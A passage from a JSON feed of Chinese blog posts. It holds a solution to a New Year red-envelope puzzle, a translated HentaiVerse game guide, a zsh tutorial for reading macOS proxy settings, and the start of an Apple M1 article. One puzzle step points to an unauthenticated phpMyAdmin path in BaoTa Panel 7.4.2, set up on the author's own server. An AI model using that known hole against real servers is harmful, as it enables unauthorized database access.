(ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 